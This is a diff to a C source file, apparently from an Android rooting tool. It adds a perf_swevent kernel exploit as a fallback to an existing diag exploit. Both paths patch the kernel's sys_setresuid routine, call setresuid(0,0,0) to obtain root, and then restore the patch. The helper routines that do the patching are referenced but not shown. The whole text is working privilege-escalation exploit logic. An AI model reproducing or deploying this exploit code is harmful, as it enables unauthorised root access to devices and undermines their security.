@@ -26,6 +26,7 @@
 #include <sys/system_properties.h>
 
 #include "libdiagexploit/diag.h"
+#include "perf_swevent.h"
 
 typedef struct _supported_device {
   const char *device;
@@ -122,26 +123,52 @@ restore_sys_setresuid(unsigned long int sys_setresuid_address)
   return inject_command(bne, sys_setresuid_address + 0x42);
 }
 
+static bool
+attempt_perf_swevent_exploit(unsigned long int sys_setresuid_address)
+{
+  int ret;
+  if (!break_with_perf_swevent(sys_setresuid_address)) {
+    return false;
+  }
+
+  ret = setresuid(0, 0, 0);
+  restore_with_perf_swevent(sys_setresuid_address);
+
+  return (ret == 0);
+}
+
+static bool
+attempt_diag_exploit(unsigned long int sys_setresuid_address)
+{
+  int ret;
+
+  if (!break_sys_setresuid(sys_setresuid_address)) {
+    return false;
+  }
+
+  ret = setresuid(0, 0, 0);
+  restore_sys_setresuid(sys_setresuid_address);
+
+  return (ret == 0);
+}
+
 int
 main(int argc, char **argv)
 {
-  int ret;
   unsigned long int sys_setresuid_address;
+  bool success;
 
   sys_setresuid_address = get_sys_setresuid_addresses();
   if (!sys_setresuid_address) {
     exit(EXIT_FAILURE);
   }
 
-  ret = break_sys_setresuid(sys_setresuid_address);
-  if (ret < 0) {
-    exit(EXIT_FAILURE);
+  success = attempt_perf_swevent_exploit(sys_setresuid_address);
+  if (!success) {
+    success = attempt_diag_exploit(sys_setresuid_address);
   }
 
-  ret = setresuid(0, 0, 0);
-  restore_sys_setresuid(sys_setresuid_address);
-
-  if (ret < 0) {
+  if (!success) {
     printf("failed to get root access\n");
     exit(EXIT_FAILURE);
   }
